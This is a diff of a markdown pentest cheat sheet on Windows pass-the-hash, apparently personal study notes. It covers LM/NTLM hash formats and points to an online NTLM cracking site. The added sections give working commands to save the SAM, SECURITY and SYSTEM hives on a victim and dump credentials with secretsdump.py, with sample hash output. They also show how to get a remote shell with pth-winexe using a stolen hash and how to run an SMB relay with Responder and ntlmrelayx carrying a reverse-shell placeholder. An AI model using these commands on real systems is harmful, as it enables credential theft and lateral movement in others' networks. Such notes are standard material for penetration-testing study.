@@ -1,7 +1,7 @@
 # Pass-The-Hash Windows
 
 In most case of leathral movment, we usually don't have password. 
-This technique, allows us to authenticate to a remote target by using a valid username and NTLM/LM hash rather than username and password. First let's understand the diffrences between LM,NTLM and NTLMv1/v2 hashes:
+This PTH technique, allows us to authenticate to a remote target by using a valid username and NTLM/LM hash rather than username and password. First let's understand the diffrences between LM,NTLM and NTLMv1/v2 hashes:
 
 ## Lan Manager (LM) Hashes
 
@@ -29,6 +29,7 @@ This hash divided by semicolon, means:
 
 
 Our final NTLM hash for brute force attack will be *aad3c435b514a4eeaad3b935b51304fe*
+For online cracking use: https://hashkiller.co.uk/Cracker/NTLM
 
 ## NT (New Technology) Hashes
 
@@ -48,6 +49,8 @@ ITguy:1007:AAD3B435B51404EEAAD3B435B51404EE:38103E9BF8D09200D725F1541ECC5BCA:::
 ```
 
 In both cases, it is the same format. However, the string "NO PASSWORD" or "AAD3B435B51404EEAAD3B435B51404EE" display in place of no password depend on the tool being used to dump those hashes as normally LM hash is empty and not stored. NTLM hash can be cracked to gain password, or used to pass-the-hash.
+
+For online cracking use: https://hashkiller.co.uk/Cracker/NTLM
 
 ## NTLMv1/v2
 
@@ -85,22 +88,87 @@ C:\>
 
 ## Dump Hashes
 
+### Using FgDump.exe tool
+
 Dump hashes from running system using fgdump.exe from Kali as following:
 
 ```
-root@kali:~# cd /usr/share/windows-binaries/fgdump;
+root@kali:~# cd /usr/share/windows-binaries/fgdump
 root@kali:/usr/share/windows-binaries/fgdump# python -m SimpleHTTPServer 80
 ```
 
-Or by using powershell script to dump hashes from memory:
+### From Compromised system
+
+If we already compromised system, then we able extract the values of SAM files from you system and then dump thier hashes in your kali machine:
+
+On victim machine (has to run under SYSTEM-level privileges):
 
 ```
-[TBD]
+C:\> reg.exe save hklm\sam c:\temp\sam.save
+C:\> reg.exe save hklm\security c:\temp\security.save
+C:\> reg.exe save hklm\system c:\temp\system.save
+
+```
+
+Then use those copy of the SYSTEM, SECURITY and SAM hives back to your kali machien and use secretsdump.py to dump hashes:
+
+
+```
+root@kali:~# secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+Impacket v0.9.11-dev - Copyright 2002-2013 Core Security Technologies
+
+[*] Target system bootKey: 0x602e8c2947d56a95bf9cfad9e0bbbace
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+renadm:500:aad3b435b51404eeaad3b435b51404ee:3e24dcead23468ce597d6883c576f657:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+support:1000:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+[*] Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)
+hdes:6ec74661650377df488415415bf10321:securus.corp.com:SECURUS:::
+Administrator:c4a850e0fee5af324a57fd2eeb8dbd24:SECURUS.CORP.COM:SECURUS:::
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:2fb3672702973ac1b9ade0acbdab432f
+...
 
 ```
 
 ## Practical Usage PTH
 
-TBD...
+### Pth-winexe
 
+This help us to get an interactive command line with the remote victim:
+
+USAGE:
+
+```
+pth-winexe -U DOMAIN/user%hash //$ip cmd
+```
+
+Example:
+```
+root@kali:~# pth-winexe -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.12 cmd.exe
+E_md4hash wrapper called.
+HASH PASS: Substituting user supplied NTLM HASH...
+Microsoft Windows \[Version 6.3.9600\]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+Server\Administrator
+```
+
+### SMB Relaying attack
+
+Fire up the Responder.py tool:
+
+```
+root@kali:~# python Responder.py -I eth1 -r -d -w
+``
+
+In another window running the following command using Impacket Python:
+
+```
+root@kali:~# ntlmrelayx.py -tf targets.txt -c [POWERSHELL REVERSE SHELL]
+``
+
+Upon successful relay it will dump the SAM database of the target and executing a command in background using the NTLM hash.
 
